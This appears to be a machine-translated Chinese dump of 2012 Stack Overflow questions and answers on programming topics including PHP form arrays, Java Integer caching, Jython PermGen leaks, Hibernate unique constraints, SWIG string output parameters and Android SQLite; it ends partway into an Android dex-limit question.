我的部门大量参与报告分支机构活动/维护/管理，其中罐装 TFS 报告的主要重点更多地关注工作项目和消耗率（对我的部门没有用处）。

理想情况下，我想知道实现这一目标涉及哪些 SQL，而不必针对分支进程运行探查器、破译日志并解密所有涉及的 SP/函数/视图，以识别所涉及的每个表之间的编程连接，以便可以开发 SSRS 报告 (2008r2) 以更动态地提供此预定信息...

我不能成为发布管理部门中唯一需要此信息的人...有人可以帮忙吗？

# php - 带有数组的表单名称

> ID：11955942
> 
> 赞同：1
> 
> 时间：2012-08-14T15:39:49.230
> 
> 标签：php

我想将：转换`"controllers[page[title_new]]"`为`"controllers[page][title_new]"`. 因此，我可以使用以下输入字段填写表单：

```
<?php $name = 'controllers[page[title_new]]' ?>

<input type='text' name='<?= $name; ?>'> 
```

提交表单后，您将获得[$_POST](https://www.php.net/manual/en/reserved.variables.post.php) =

```
array(controllers => array(page => array(title_new = ''))); 
```

现在要显示这个我想：

```
<input type='text' name='<?= $name; ?>' value='<?= $_POST[CONVERT($name)]; ?>'> 
```

那么PHP中是否有这样的`CONVERT`内置功能？或者我怎样才能做到最好？

*请注意，为了便于阅读，我省略了所有验证、转义、htmlentities 等。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:24:46.353

好吧，以下工作：

```
$name = 'controllers[page[title_new]]';
$name = str_replace(array('[', ']]'), array('][', ']'), $name);
// Gives: controllers][page][title_new]] -> controllers][page][title_new]

$name = preg_replace('/\]\[/','[', $name, 1);
// Gives: controllers[page][title_new] 
```

# ios - iOS 5 Twitter API 性能不佳，性能缓慢

> ID：11955943
> 
> 赞同：0
> 
> 时间：2012-08-14T15:39:50.290
> 
> 标签：ios, performance, twitter

很好，苹果将 twitter 集成为 iOS 5 的原生部分。但性能真的很糟糕。我曾经为任何 twitter 操作添加加载指示器。加载时间在 iPad 1 上持续超过一分钟。iPad 3 要快得多，但仍然很烦人。

有没有人遇到过同样的问题并解决了这个问题？有什么办法可以预载推特的难点吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-16T13:21:42.417

我通过在后台线程中执行 Twitter 请求解决了这个问题。

# java - Java 7 无法收集由 java 5 收集的永久代

> ID：11955948
> 
> 赞同：10
> 
> 时间：2012-08-14T15:39:58.860
> 
> 标签：java, garbage-collection, jython, permgen

有谁知道为什么 java 7 无法收集应用程序的永久代，导致 java.lang.OutOfMemoryError: PermGen，而 java 5 收集永久代并且应用程序运行良好？

应用程序在循环中评估 jython 表达式，一次迭代大约是。5 秒。循环体如下所示：

```
PythonInterpreter py = new PythonInterpreter();
py.set("AI", 1);
((PyInteger)py.eval(expr)).getValue() 
```

为在 java 7 和 java 5 中运行的应用程序拍摄的 jvisual vm 屏幕截图。

在这两种情况下，都使用相同的参数：

```
-Xmx700m 
-XX:MaxPermSize=100m
-XX:+HeapDumpOnOutOfMemoryError
-Xloggc:"C:\Temp\gc.log" -XX:+PrintGCDetails  -XX:-TraceClassUnloading -XX:+PrintClassHistogram 
```

![爪哇 7](../Images/9e307dda4ceb87cb5f69344af5338bc4.png) ![爪哇 5](../Images/8ce6c0107919a0f95146124102691c8c.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T08:08:54.037

有一个重现问题的小例子，我发现在 Eclipse 之外的 java 7 中运行的程序不会在永久代中出现内存泄漏。

```
import org.python.core.PySystemState;
import org.python.util.PythonInterpreter;

public class Test01 {

  public static void main(String[] args) throws Exception  {
    PySystemState.initialize();
    long startNanos = System.nanoTime();
    for(int i = 0; i < 450000; i++)    {
        PythonInterpreter pi = new PythonInterpreter();
        long elapsedNanos = System.nanoTime() - startNanos;
        int avgStepInMicros = (int)((elapsedNanos / 1000) / (i+1));
        final String code = String.format(
                "stepNo = %d + 1\n" +
                "if stepNo %% 100 == 0:\n" + 
                "  print 'stepNo: %%d,  elapsedMillis: %%d, avgStepInMicros: %%d' %% (stepNo, %d, %d)", i, elapsedNanos/1000000, avgStepInMicros);
        pi.exec(code);
    }
  }
} 
```

[MAT](http://www.eclipse.org/mat/)将调试器线程显示为垃圾收集器根。

![GCRoot](../Images/9e08918d76119f4f08c88d56c1067c6f.png)

奇怪的是，java 5 中的调试应用程序没有这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T13:49:24.993

permgen 泄漏的一种可能性是每个 PyInteger 实现的 Serializable 接口被存储在静态`class_to_type`映射 (PyType.java:101) 中，这是一个 Jython[错误](http://bugs.jython.org/issue1522)。我知道在 5 到 7 之间对 permgen 分配的唯一有趣的变化是删除了 7 中的实习生字符串以及对直接字节缓冲区内存分配的一些更改，因此您的图形的时间行为可能可以通过[卸载](http://docs.oracle.com/javase/specs/jls/se5.0/html/execution.html#12.7)来解释Java 5 中每次迭代的类型。

# hibernate - 多列的唯一约束

> ID：11955952
> 
> 赞同：53
> 
> 时间：2012-08-14T15:40:07.933
> 
> 标签：hibernate, postgresql, seam, hibernate-mapping, seam2

我正在使用 SEAM 2/Hibernate 和 PostgreSQL 9 数据库。我有下表

```
Active Band
===========
active_band_id serial
active_band_user text
active_band_date timestamp
active_band_process integer 
```

我想添加一个约束，以确保每个新条目都具有 active_band_user 和 active_band_date 的唯一组合。

每秒可能有很多尝试插入，所以我需要尽可能高效，是否有可以在实体映射中使用的 SEAM / hibernate 注释？

提前致谢

* * *

## 回答 #1

> 赞同：98
> 
> 时间：2012-08-14T16:24:27.813

没有在插入/更新之前检查唯一性的 Hibernate 注释。但是，如果使用自动数据库创建，则会有一个注释会对数据库产生这样的约束：

```
 @Table(
    name="ACTIVE_BAND", 
    uniqueConstraints=
        @UniqueConstraint(columnNames={"active_band_user", "active_band_date"})
) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-09-29T16:37:27.893

在更现代的语法中，它将是：

```
@Table(
    name="ACTIVE_BAND", 
    uniqueConstraints =
        [UniqueConstraint(
                columnNames = ["active_band_user", "active_band_date"]
        )]
) 
```

# javascript - 递归函数在第一个循环后停止

> ID：11955956
> 
> 赞同：2
> 
> 时间：2012-08-14T15:40:28.623
> 
> 标签：javascript, jquery, ajax, recursion

# 语境

我用 Ajax 调用更新了几个站点，一一更新以节省服务器。

我创建了一个递归函数，当 Ajax 调用完成时它会再次运行自己。

# 问题

该函数在第一个循环后停止。

任何想法 ？

# 代码

```
var updateSite = function (site) {
    if (site.status == 'waiting for update') {
        updateStatus(i, site, 'update in progress');

        $.get(site.url)
            .success(function () {
                updateStatus(i, site, 'updated');
            })
            .error(function () {
                updateStatus(i, site, 'not updated');
            })
            .complete(function () {
                updateSite(allSites[i++]);
            });
    }
};

var i = 0;

updateSite(allSites[i]); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:45:37.587

更改完整功能如下：

```
function () {
     updateSite(allSites[++i]);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:44:28.017

有任何错误信息吗？

`updateSite`定义您用于完成的匿名函数时，可能尚未定义var 。

尝试这个：

```
var updateSite;
updateSite = function (site) {
    if (site.status == 'waiting for update') {
        updateStatus(i, site, 'update in progress');
.... // everything else the same... 
```

# java - == 使用抽象数据类型，相同条件下的不同结果

> ID：11955958
> 
> 赞同：1
> 
> 时间：2012-08-14T15:40:30.850
> 
> 标签：java, memory, memory-management, jvm, shared-memory

> **可能重复：**
> [整数包装器对象仅在值 127 内共享相同的实例？](https://stackoverflow.com/questions/5117132/integer-wrapper-objects-share-the-same-instances-only-within-the-value-127)

```
public class test
{
  public static void main(String args[])
  {
    Integer a1=127;
    Integer a2=127;
    System.out.println(a1==a2); //output: true

    Integer b1=128;
    Integer b2=128;
    System.out.println(b1==b2); //output: false

    Long c1=127L;
    Long c2=127L;
    System.out.println(c1==c2); //  output: true

    Long d1=128L;
    Long d2=128L;
    System.out.println(d1==d2); //output: false 
  }
} 
```

# 输出：

> ```
> true
> false
> true
> false 
> ```

您也可以使用负值。当您观察带有值的输出时，它们的行为会有所不同。产生这种不同结果的原因是什么？

对于任何数字，范围应为 -127 到 +127，然后`==`为真或为假。

（所有人）对不起，这是一个拼写错误，我错误地把它当作原始的，但它是抽象的。对不起这个错误。现在更正...

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-14T15:42:23.570

整数不是原始的，它是一个对象。如果你用过`int`，否则`long`你只会得到`true`.

你得到这个结果的原因是整数被缓存在 -128 和 127 之间的值，所以`Integer i = 127`总是返回相同的引用。`Integer j = 128`不一定会这样做。然后，您将需要使用`equals`来测试底层的相等性`int`。

这是在[Java 语言规范 #5.1.7](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.1.7)中定义的。

请注意，超出该范围的值的行为 [-128; 127]未定义：

> 例如，内存限制较少的实现可能会缓存所有 char 和 short 值，以及 -32K 到 +32K 范围内的 int 和 long 值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:42:16.647

Integer 不是原始类型，而是包装类型。请参阅：[http ://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T16:09:27.770

首先，整数不是基元（int 是）。但是要回答为什么会发生这种情况，这是因为在 Integer 实现中发现了一个内部缓存：

```
 /**
 * Cache to support the object identity semantics of autoboxing for values between 
 * -128 and 127 (inclusive) as required by JLS.
 *
 * The cache is initialized on first usage. During VM initialization the
 * getAndRemoveCacheProperties method may be used to get and remove any system
 * properites that configure the cache size. At this time, the size of the
 * cache may be controlled by the vm option -XX:AutoBoxCacheMax=<size>.
 */ 
```

因此，本质上，当您比较两个已缓存的整数时，您是在将同一个对象与其自身进行比较，因此 == 返回 true，但是当您比较高于 127 或低于 -127 的整数（非缓存整数）时，您正在比较两个不同的整数实例。

如果你使用 equals 或 compareTo 方法，你会得到*你*期望看到的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:42:11.647

`Integer`是对象（包装类），而不是原始类型

最好进行比较，例如`a1.intValue() == a2\. intValue()`instead (or) `equals()`。

# android - 没有创建列得到异常android

> ID：11955959
> 
> 赞同：0
> 
> 时间：2012-08-14T15:40:31.657
> 
> 标签：android, sqlite

好吧，这是我的 DatabaseHelper 类

```
public class DatabaseHelper extends SQLiteOpenHelper {

    static final String dbName="demoDB";

    public DatabaseHelper(Context context) {
            super(context, dbName, null, 1);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
            String sql = "CREATE TABLE IF NOT EXISTS players (" +
                                            "id INTEGER PRIMARY KEY AUTOINCREMENT, " + 
                                            "playerName TEXT)";
            db.execSQL(sql);

            ContentValues values = new ContentValues();

            values.put("playerName", "John");
            db.insert("players", "playerName", values);

            values.put("playerName", "George");
            db.insert("players", "playerName", values);

            values.put("firstName", "Marie");
            db.insert("players", "playerName", values);
            System.out.println("Hello");

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS players");
            onCreate(db);
    }

} 
```

在我的主要活动中，这就是我获取数据的方法。

```
if (cursor!= null) {
            if (cursor.moveToFirst()) {
                do {
                     System.out.println(cursor.getString(cursor.getColumnIndexOrThrow("playerName")));            
                } while (cursor.moveToNext());
            }
        } 
```

为什么没有创建列？我得到了这个例外。

```
java.lang.RuntimeException: Unable to start activity ComponentInfo{com.mkyong.android/com.mkyong.android.Stats}: java.lang.IllegalArgumentException: column 'playerName' does not exist 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:58:52.510

在与光标交互之前您是否选择了任何内容？您的光标应该是“选择...”SQL 调用的结果，但我在 DatabaseHelper 或 MainActivity 中没有看到任何表明您正在进行任何类型的选择的光标。

此外，当您向表中插入值时，我相信第二个参数应该是 null [ `db.insert("players", null, values)`]。它适用于`nullColumnHack`，如果您没有在行中输入任何数据，您可以使用它。

```
nullColumnHack  optional; may be null. SQL doesn't allow inserting a completely empty row without naming at least one column name. If your provided values is empty, no column names are known and an empty row can't be inserted. If not set to null, the nullColumnHack parameter provides the name of nullable column name to explicitly insert a NULL into in the case where your values is empty. 
```

**编辑**

好吧，到目前为止，您已经创建了一个表并插入了一些记录。下一步是创建基本的 CRUD 操作（创建、检索、更新、删除），但对于您的情况，您需要从检索开始。

检索基本上意味着您正在从数据库中读取/检索数据，因此您可以在应用程序中使用它。当您从数据库读取数据时，它会存储在光标中。因此，您需要：

1.  在你的数据库助手中创建一个方法来从你的数据库中读取数据
2.  在您的主要活动中，调用您在步骤 #1 中创建的方法。结果存储在游标中。
3.  在您的主要方法中，从光标中提取数据以便您可以使用它。（看起来你已经在你的主要活动中尝试过这个）。

这是一个关于设置数据库以及如何为数据库创建 CRUD 操作的精彩教程的链接。现在，向下滚动并阅读检索操作。 [http://www.androidhive.info/2011/11/android-sqlite-database-tutorial/](http://www.androidhive.info/2011/11/android-sqlite-database-tutorial/)

如果我是你，我会阅读整个教程。现在还有许多其他有用的提示和建议非常值得投资。例如，在 DatabaseHelper 类中为表名、数据库名、列名创建常量是一个*非常*好的主意，因为如果您继续手动输入所有列名和表名，迟早会出现拼写错误。如果您使用变量，您将在运行时收到编译错误而不是异常。

# java - C std::string 作为带有 SWIG 的 Java 中的输出参数

> ID：11955962
> 
> 赞同：4
> 
> 时间：2012-08-14T15:40:55.160
> 
> 标签：java, c++, swig

我需要用 SWIG 包装一个 C++ 库才能将它与 Java 一起使用。

我已经有一些方法可以工作，但是我遇到了一种我不知道如何解决的情况。

我有几个这样的方法：

```
void method1(std::string & name, std::string & result);

bool method2(std::string & name, std::string & alias, std::string & resurnValue, std::string & returnType); 
```

注意：实际上这是一个名为 MyClass 的类的成员方法。

我可以将第一个方法更改为返回 a`std::string`而不是 being `void`，这应该可以；但我不知道如何处理最后两个参数是输出参数的第二种方法。我已经看到了几个关于`char *`输出参数的问题（[使用 Swig/Python 在 C 中传递多个参数和分配字符串](https://stackoverflow.com/questions/10061053/passing-multiple-parameters-and-allocating-strings-in-c-using-swig-python)），但在我的情况下应该是 a`std::string`并且 SWIG 的文档没有提到这种情况，请[在此处输入链接描述](http://www.swig.org/Doc2.0/Library.html#Library_std_string)。此外，我可能会遇到更多返回 3 个或更多输出参数的方法，可能具有不同的类型。

最后，我对接口有了一点控制，我还在开发一个作为库入口点的类，但它只是将调用传递给真正的实现。

例如，通过这个我已经设法改变了一个方法`method3(std::string & s)`，`method3(const std::string & s)`所以我可以从 Java 中使用它`String`。

所以稍微修改方法签名是可能的，但如果一个本地方法返回 n 个输出参数，我应该返回所有参数（我不能创建新方法来返回每个参数）。

**更新：** 我一直在研究 Flexo 提供的解决方案并且效果很好，但是我正在考虑做一个类来包装 std::string 并使用它与返回的字符串进行交互，这是与 Flexo 的第二种解决方案非常相似的方法，但是使用这个 StringWrapper 而不是使用 java String 数组，基本上看起来像这样：

```
/*
* The MyClass.i file
*/
%module example

%include "std_string.i"

%{
    class StringPtr{

    private:
        stdString str;

    public:
        StringPtr(){

    }

        StringPtr(const stdString & str){
        this->str = stdString(str);
        }

    stdString & getStrRef(){
        return (this->str);
        }

        stdString getStrVal(){
        return stdString(this->str);
        }

        ~StringPtr(){

        }
    };

%}

/////////////////// Export StringPtr to Java

class StringPtr{

    public:
        StringPtr();

    StringPtr(const stdString & str);

    stdString getStrVal();

    ~StringPtr();

};

// I think this is nor necessary
%rename ("$ignore", fullname=1) "StringPtr::getStrRef";

%extend MyClass {

    void method1(cons std::string & name, StringPtr & result){
        $self->method1(name, result.getStrRef());
    }

    bool method2(cons std::string & name, cons std::string & alias, StringPtr & returnValue, StringPtr & returnType){
        $self->method2(name, alias, returnValue.getStrRef(), returnType.getStrRef());
    }

};

%rename ("$ignore", fullname=1) "MyClass::method1";
%rename ("$ignore", fullname=1) "MyClass::method2";

%include "MyClass.h" 
```

所以我想知道，从性能的角度来看，witch 更好，结构解决方案（通过 Flexo），通过 Flexo 的字符串数组或这个指针（就像只有一个成员的结构。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-15T10:36:32.327

假设您想在不修改现有头文件的情况下包装它，可以想到两种方法。鉴于我用于测试的头文件：

```
#include <string>

inline bool method2(const std::string & name, const std::string & alias, std::string & resurnValue, std::string & returnType) {
  resurnValue = name;
  returnType = alias;
  return true;
} 
```

包装它的最简单方法是使用`%inline`创建一个重载，将所有输出包装为一种类型：

```
%module test

%include <std_string.i>

%{
#include "test.h"
%}

%inline %{
  struct Method2Result {
    bool b;
    std::string s1;
    std::string s2;
  };

  Method2Result method2(const std::string& in1, const std::string& in2) {
    Method2Result ret;
    ret.b = method2(in1,in2,ret.s1,ret.s2);
    return ret;
  }
%}

// Optional: don't wrap the original form of method2 at all:
%ignore method2;

%include "test.h" 
```

这适用于：

```
public class run {
  public static void main(String[] args) {
    System.loadLibrary("test");
    Method2Result ret = test.method2("foo", "bar");
    System.out.println(ret.getB() + " - " + ret.getS1() + ", " + ret.getS2());
  }
} 
```

您可以使用`std::pair`or `boost::tuple`，`%template`但我怀疑包装`boost::tuple`不是微不足道的，并且像这样您可以将成员命名为您的库用户将理解的适当名称，而不仅仅是`first`and `second`，而不使用`%rename`它变得更加冗长，而不仅仅是在其中编写自定义结构`%inline`.

* * *

或者，SWIG 提供了 OUTPUT 类型映射，您可以使用它`%apply`来创建输出 argumnet。这些被包装为一个包含 1 个元素的数组——传递数组的语义与输出参数的语义相匹配。不幸的是`std::string`，typemaps.i 中没有 for，所以我们必须自己编写。理想情况下，我会重用该`OUTPUT_TYPEMAP`文件中的宏并稍微修改 argout 类型映射，但它会在`#undef`没有可能的情况下被限制。幸运的是，在这种情况下复制和修改是相当简单的：

```
%module test

%{
#include "test.h"
%}

%typemap(jstype) std::string& OUTPUT "String[]"
%typemap(jtype) std::string& OUTPUT "String[]"
%typemap(jni) std::string& OUTPUT "jobjectArray"
%typemap(javain)  std::string& OUTPUT "$javainput"
%typemap(in) std::string& OUTPUT (std::string temp) {
  if (!$input) {
    SWIG_JavaThrowException(jenv, SWIG_JavaNullPointerException, "array null");
    return $null;
  }
  if (JCALL1(GetArrayLength, jenv, $input) == 0) {
    SWIG_JavaThrowException(jenv, SWIG_JavaIndexOutOfBoundsException, "Array must contain at least 1 element");
  }
  $1 = &temp;
}
%typemap(argout) std::string& OUTPUT {
  jstring jvalue = JCALL1(NewStringUTF, jenv, temp$argnum.c_str()); 
  JCALL3(SetObjectArrayElement, jenv, $input, 0, jvalue);
}

%apply  std::string& OUTPUT { std::string & resurnValue }
%apply  std::string& OUTPUT { std::string & returnType }

%include "test.h" 
```

这可以像这样使用：

```
public class run {
  public static void main(String[] args) {
    String[] out1 = new String[1];
    String[] out2 = new String[1];
    boolean retb = test.method2("foo", "bar", out1, out2);
    System.out.println(retb + " - " + out1[0] + ", " + out2[0]);
  }
} 
```

这两个都经过测试并在我的系统上运行。对于这种情况，我喜欢这种`%inline`方法。（如果它是您将使用的成员函数`%extend`）。在一般情况下，可以在不编写任何额外代码的情况下应用 OUTPUT 类型映射。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T15:48:27.433

如果你有 C++11 支持，你可以返回一个[std::tuple](http://en.cppreference.com/w/cpp/utility/tuple) of `bool`,`std::string`和`std::string`.

否则，您可以创建嵌套的[std::pairs](http://en.cppreference.com/w/cpp/utility/pair)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-01T04:56:46.977

只是为了好玩，这就是我们使用 JavaCPP 的方法：

```
public static native boolean method2(@StdString String name,
        @StdString @Cast("char*") BytePointer alias,
        @StdString @Cast("char*") BytePointer returnValue,
        @StdString @Cast("char*") BytePointer returnType);

public static void main(String[] args) {
    BytePointer alias = new BytePointer();
    BytePointer returnValue = new BytePointer();
    BytePointer returnType = new BytePointer();
    method2("Unknown", alias, returnValue, returnType);
    alias.getString();
    returnValue.getString();
    returnType.getString();
} 
```

我很想听听 SWIG 如何成为更好的解决方案！

# execjs - [Rails 3.2.8 & ExecJS 1.4.0]出现语法错误，但我该如何调试

> ID：11955964
> 
> 赞同：6
> 
> 时间：2012-08-14T15:40:58.310
> 
> 标签：execjs

例如我有以下代码：

 `````
function f(p) {
 for(var i=0;i<1;i++)
  {
   p=unescape(p);
  }
  return p;
 }

 var c='something'; 
```` 

`当我在萤火虫控制台中通过它时，它返回未定义。现在很好`

 `当我尝试使用 ExecJS 运行它时。ExecJS 返回：ExecJS::RuntimeError: SyntaxError: Unexpected token var

我不知道从哪里开始寻找问题。有人有想法吗？``

# c# - XPath C# 属性值

> ID：11955966
> 
> 赞同：1
> 
> 时间：2012-08-14T15:41:07.390
> 
> 标签：c#, xml, xpath

下面是读入XmlDocument的XML文件

```
<Test xmlns="http://api.test.com/v2" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
    <Result id="2015" description="Invalid Token" />
</Test > 
```

我需要的是存储在一些 TextBox 中的 'id' 属性值（“2015”）

这就是 XmlDocument 的加载方式

```
XmlDocument updateUser = new XmlDocument();
updateUser.Load(response.GetResponseStream()); 
```

一直到这里都很好。

然后，创建命名空间并搜索节点

```
XmlNamespaceManager nsmgr = new XmlNamespaceManager(updateUser.NameTable);
nsmgr.AddNamespace("restup", "http://api.test.com/v2");

XmlNodeList locationElements1 = updateUser.SelectNodes("//restup:Test", nsmgr);
foreach (XmlNode Test in locationElements1)
{
//What DO I do here to get the value of 'id' attribute from the 'Result' node and save it in txtTest Textbox.

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:47:25.237

```
var id = Test.FirstChild.Attributes["id"].Value; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:51:59.837

```
string idString = Test.FirstChild.Attributes["id"].ToString(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-16T11:54:31.413

你好，这是另一种有用的方法

```
XmlTextReader reader = new XmlTextReader(fileLocation); //fileLocation is the Path of the XML file
while (reader.Read())
{

  if (reader.NodeType == XmlNodeType.Element) //if the node is an element (not a comment, CDATA, or text)
     if (reader.Name == "Result")
       textBox1.Text = reader.GetAttribute("id");

}
reader.Close(); 
```

# jquery - 如何使我的 jQuery 更具体？

> ID：11955969
> 
> 赞同：0
> 
> 时间：2012-08-14T15:41:13.830
> 
> 标签：jquery, appendto

我试图只使用一次函数，而不是为我需要转换为选择列表的每个 UL LI 块编写它。我的工作代码在[http://jsfiddle.net/qqzB5/](http://jsfiddle.net/qqzB5/)

我试过了，但它会遍历所有 li，而不仅仅是特定部分中的那个：

```
$('.filterSection').each(function(){

        $('<select class="locationFilterSelect" />').appendTo(this);
        //Create Default option "Select One"
        $("<option />", {
           "selected": "selected",
           "value"   : "",
           "text"    : "Select One"
        }).appendTo('select', this);
        // Populate dropdown with menu items
        $('li', this).each(function() {
             var el = $(this);
             $("<option />", {
                 "text"    : el.text()
             }).appendTo('select', this);
        });
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:48:48.727

你搞砸了`.appendTo`。它需要一个论点，不是吗？而且您需要使用一些范围：将`select`变量从外部处理程序传递到内部处理程序。看看这段代码：

```
$('.filterSection').each(function(){
    var select = $('<select class="locationFilterSelect" />')
    select.appendTo(this);
    //Create Default option "Select One"
    $("<option />", {
       "selected": "selected",
       "value"   : "",
       "text"    : "Select One"
    }).appendTo(select);
    // Populate dropdown with menu items

    $(this).find('li').each(function() {
         var el = $(this);
         $("<option />", {
             "text"    : el.text()
         }).appendTo(select);
    });
}); 
```

​</p>

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:53:52.790

```
$('.filterSection').each(function(){
        var section = $(this);
        var select =  $('<select class="locationFilterSelect" />')
       select.appendTo(section);
        //Create Default option "Select One"
        $("<option />", {
           "selected": "selected",
           "value"   : "",
           "text"    : "Select One"
        }).appendTo(select);
        // Populate dropdown with menu items       
        $(this).find('li').each(function(i,el) {
             $("<option />", {
                 "text"    : $(el).text()
             }).appendTo(select);
        });
    }); 
```

[http://jsfiddle.net/tL5tD/](http://jsfiddle.net/tL5tD/)

# ios - 无法在应用内购买时关闭观察者方法的视图

> ID：11955973
> 
> 赞同：0
> 
> 时间：2012-08-14T15:41:33.830
> 
> 标签：ios, in-app-purchase

我有一个使用应用内购买的应用程序。单击主视图控制器中的按钮会加载第二个视图控制器，其中包含恢复购买、购买产品和取消。有一个委托协议来关闭视图。当我单击取消时它工作正常，但如果我在任何商店观察者方法中以编程方式设置关闭它不起作用。通过 NSNotification 它似乎可以工作，但我想知道它为什么不工作。尝试从那里更改按钮的 alpha 值也不起作用。先感谢您。

Appdelegate.h

```
#import <UIKit/UIKit.h>
#import "StoreNavigationController.h"

@interface AppDelegate : UIResponder <UIApplicationDelegate>

@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic)  StoreNavigationController* observer;
@end 
```

Appdelegate.m

```
#import "AppDelegate.h"

@implementation AppDelegate

@synthesize window = _window;
@synthesize observer;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    observer = [[StoreNavigationController alloc] init];
    [[SKPaymentQueue defaultQueue] addTransactionObserver:observer];
    return YES;
} 
```

视图控制器.h

```
#import <UIKit/UIKit.h>
#import "storeNavigationController.h"

@class completeView;
@interface ViewController : UIViewController <StoreNavigationControllerDelegate>
- (void)storeNavigationControllerDidFinish;
@end 
```

视图控制器.m

```
 - (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
 if ([[segue identifier] isEqualToString:@"storeView"]) {
 [[segue destinationViewController] setDelegate:self];

     }
 }

- (void)storeNavigationControllerDidFinish
{
    [self updateView];
    [self dismissModalViewControllerAnimated:YES];
}
//There is also a method in this file launching [self performSegueWithIdentifier:@"storeView" sender:self]; 
```

storeNavigationController.h

```
#import <UIKit/UIKit.h>
#import <StoreKit/StoreKit.h>
#import "plistController.h"

@protocol StoreNavigationControllerDelegate <NSObject>
- (void)storeNavigationControllerDidFinish; //View dismisser
@end

@class StoreNavigationController;
@interface StoreNavigationController : UIViewController <SKPaymentTransactionObserver>
@property (strong, nonatomic) id <StoreNavigationControllerDelegate> delegate;
//User actions
- (IBAction)restoreItems:(UIButton *)sender;
- (IBAction)buyItem:(UIButton *)sender;
- (IBAction)cancelPurchase:(UIButton *)sender;

//Methods SKPaymentTransactionObserver 
- (void) completeTransaction:(SKPaymentTransaction *)transaction;
- (void) failedTransaction:  (SKPaymentTransaction *)transaction;
- (void) restoreTransaction: (SKPaymentTransaction *)transaction;
- (void) paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions;
@end 
```

storeNavigationController.m

```
- (IBAction)cancelPurchase:(UIButton *)sender {
[self.delegate storeNavigationControllerDidFinish]; //this one works ok
}

- (void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions {
    for (SKPaymentTransaction *transaction in transactions)
    {
        switch (transaction.transactionState)
        {
            case SKPaymentTransactionStatePurchased:
                [self completeTransaction:transaction];
                [self.delegate storeNavigationControllerDidFinish]; //Any of those calls in the switch doesn't work.
                break;
             case SKPaymentTransactionStateFailed:
                [self failedTransaction:transaction];
                [self.delegate storeNavigationControllerDidFinish];
                break;
             case SKPaymentTransactionStateRestored:
                [self restoreTransaction:transaction];
                [self.delegate storeNavigationControllerDidFinish];
             default:
                break;
         }
     }
  }

 - (void)paymentQueue:(SKPaymentQueue *)queue removedTransactions:(NSArray *)transactions       {
    for (SKPaymentTransaction* transaction in transactions) {
         NSLog(@"Transacción eliminada de la cola: %@", transaction.description);
     }
           [self.delegate storeNavigationControllerDidFinish]; //Not working

  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:41:02.930

代表应该使用 assign 属性。

```
 @property (assign, nonatomic) id <StoreNavigationControllerDelegate> delegate; 
```

但这可能不是你的问题。您是否尝试在完成事务或恢复事务之前调用委托方法。在调用这些方法之前，您是否设置了断点或使用 NSLog 检查委托是否不为零？

```
NSLog(@"delegate: %@", self.delegate); 
```

# html - 播放框架：Html 模板内容未正确转义

> ID：11955975
> 
> 赞同：1
> 
> 时间：2012-08-14T15:41:36.497
> 
> 标签：html, templates, scala, playframework, playframework-2.0

我正在尝试使用现有模块在 html 模板中填充列表

```
@{Nav.list.map( l => 
    l.id match {
        case "Art" => { <li id="art"><span>Articles</span></li> }
        case "Due" => { <li id="toggle"><a href="javascript:void(0)" title="Links"><span>Links</span></a>
                            <div id="drawer">
                                <div id="drawerContent" style="display:none;">
                                    <ul>
                                        <li><a href="#" title="link hover"><span>link title 2</span></a></li>
                                        <li><a href="#" title="link hover"><span>link title 3</span></a></li>
                                        <li><a href="#" title="link hover"><span>link title 4</span></a></li>
                                    </ul>
                                </div>
                            </div>
                        </li> } 
        case _ => {     <li id="@l.id"><a href="@l.href" title="@l.title"><span>@l.title</span></a></li> }
    } )} 
```

@ 不是作为最后一个案例的转义字符，而是被解析为 @l.id 等格式化程序在嵌套 scala 结构方面存在问题，但我不确定。

我尝试使用 for 而不是 map 并尝试封闭和转义匹配结构，它们编译但问题仍然存在

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:38:29.180

我认为这里的问题是您在执行 @{} 时处于 scala 世界，因此您可以在最后一种情况下执行以下操作：

`case _ => <li id={l.id}><a href={l.href} title={l.title}><span>{l.title}</span></a></li>`

或者我认为你可以这样做： `@Nav.list.map( l => ... )`

# android - Android：当有多个库模块时，FIELDS_IDS_SIZE Dalvik dex 文件达到最大值

> ID：11955978
> 
> 赞同：2
> 
> 时间：2012-08-14T15:41:47.903
> 
> 标签：android

下面解释的项目是使用 Eclipse Juno(4.2) 创建和构建的。

